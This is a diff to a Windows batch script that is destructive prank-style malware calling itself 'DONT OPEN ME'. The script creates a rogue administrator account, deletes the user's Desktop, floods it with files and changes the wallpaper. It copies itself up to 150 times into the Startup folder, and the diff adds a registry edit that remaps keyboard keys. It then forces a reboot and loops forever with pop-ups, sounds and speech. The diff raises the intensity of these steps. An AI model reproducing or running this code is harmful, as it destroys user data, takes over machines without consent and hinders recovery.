@@ -6,8 +6,6 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-powershell -WindowStyle Hidden -Command ""
-
 net user "DONT OPEN ME" /add
 net localgroup Administrateurs "DONT OPEN ME" /add
 
@@ -18,8 +16,8 @@ set desktop=%userprofile%\Desktop
 del /f /q "%desktop%\*" >nul 2>&1
 rmdir /s /q "%desktop%" >nul 2>&1
 
-for /l %%i in (1,1,100) do (
-    echo THIS SYSTEM BELONGS TO DONT OPEN ME > "%desktop%\DONT_OPEN_ME_IS_HERE_%%i.txt"
+for /l %%i in (1,1,300) do (
+    echo DONT OPEN ME IS HERE > "%desktop%\DONT_OPEN_ME_IS_HERE_%%i.txt"
 )
 
 set wallpaper=%userprofile%\Desktop\DONT_OPEN_ME_RED.bmp
@@ -39,22 +37,31 @@ reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 
 set startup_folder=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-for /l %%i in (1,1,50) do (
+for /l %%i in (1,1,150) do (
     setlocal enabledelayedexpansion
     set random_name=!random!!random!
     copy "%~f0" "%startup_folder%\DONT_OPEN_ME_!random_name!.bat"
     endlocal
 )
 
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v Scancode Map /t REG_BINARY /d 00000000000000000400000000005be000005be000000000 /f
+
+title DONT OPEN ME IS HERE
+
 msg * "DONT OPEN ME HAS TAKEN OVER. THIS SYSTEM IS NO LONGER YOURS."
 timeout /t 15 >nul
-
 shutdown /r /f /t 15
 
-for /l %%i in (1,1,50) do (
+for /l %%i in (1,1,150) do (
     start cmd /c echo DONT OPEN ME IS HERE && pause
 )
 
 :loop
     powershell -c (New-Object Media.SoundPlayer "C:\Windows\Media\chimes.wav").PlaySync()
+    set log_file=%desktop%\DONT_OPEN_ME_LOG_!random!.txt
+    echo YOU CANNOT ESCAPE ME > %log_file%
+    powershell -Command "[System.Windows.Forms.MessageBox]::Show('DONT OPEN ME IS HERE', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"
+    start http://DONTOPENME
+    powershell -c "(New-Object -ComObject SAPI.SpVoice).Speak('DONT OPEN ME IS HERE')"
+    timeout /t 5 >nul
     goto loop
